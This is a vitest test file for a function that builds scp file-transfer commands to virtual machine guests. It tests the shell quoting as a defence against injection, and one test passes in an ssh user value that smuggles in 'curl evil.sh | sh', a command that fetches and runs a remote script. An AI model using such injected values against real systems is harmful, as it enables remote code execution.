// Copyright 2026 Zyvor AI Labs · https://zyvor.dev
// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0

import { describe, expect, it } from 'vitest'
import { buildGuestScpCommand } from './consoleGuestFileTransfer'

describe('consoleGuestFileTransfer', () => {
  it('builds NAT scp via hypervisor port', () => {
    const cmd = buildGuestScpCommand({
      fileName: 'bundle.tar.gz',
      sshUser: 'ubuntu',
      hypervisorHost: '10.0.0.5',
      sshNatHostPort: 2222,
      guestIpPrivate: true,
    })
    expect(cmd?.command).toBe("scp -P 2222 './bundle.tar.gz' 'ubuntu'@'10.0.0.5':'/tmp/bundle.tar.gz'")
  })

  it('builds direct guest IP scp', () => {
    const cmd = buildGuestScpCommand({
      fileName: 'app.deb',
      sshUser: 'debian',
      guestIp: '203.0.113.10',
      guestIpPrivate: false,
    })
    expect(cmd?.command).toBe("scp './app.deb' 'debian'@'203.0.113.10':'/tmp/app.deb'")
  })

  it('quotes a malicious cloud-init ssh user so it cannot inject shell commands when pasted', () => {
    const cmd = buildGuestScpCommand({
      fileName: 'app.deb',
      sshUser: 'ubuntu; curl evil.sh | sh #',
      guestIp: '203.0.113.10',
      guestIpPrivate: false,
    })
    expect(cmd?.command).toBe(
      "scp './app.deb' 'ubuntu; curl evil.sh | sh #'@'203.0.113.10':'/tmp/app.deb'",
    )
  })
})
